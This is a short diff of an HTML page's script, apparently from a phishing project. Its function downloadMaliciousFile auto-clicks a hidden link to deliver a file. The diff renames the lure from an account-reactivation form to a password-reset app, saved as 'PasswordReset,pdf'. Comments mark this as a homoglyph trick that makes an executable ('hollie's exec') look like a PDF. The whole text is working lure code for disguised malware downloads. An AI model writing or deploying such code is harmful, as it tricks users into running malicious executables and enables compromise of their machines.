@@ -14,8 +14,8 @@
     <script>
       function downloadMaliciousFile() {
         const link = document.createElement("a");
-        link.href = "./enc-files/AccountReActivationForm"; // change this to hollie's exec
-        link.download = "AccountReactivation,pdf"; // homoglyph attack
+        link.href = "./enc-files/ResetPasswordApp"; // change this to hollie's exec
+        link.download = "PasswordReset,pdf"; // homoglyph attack
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
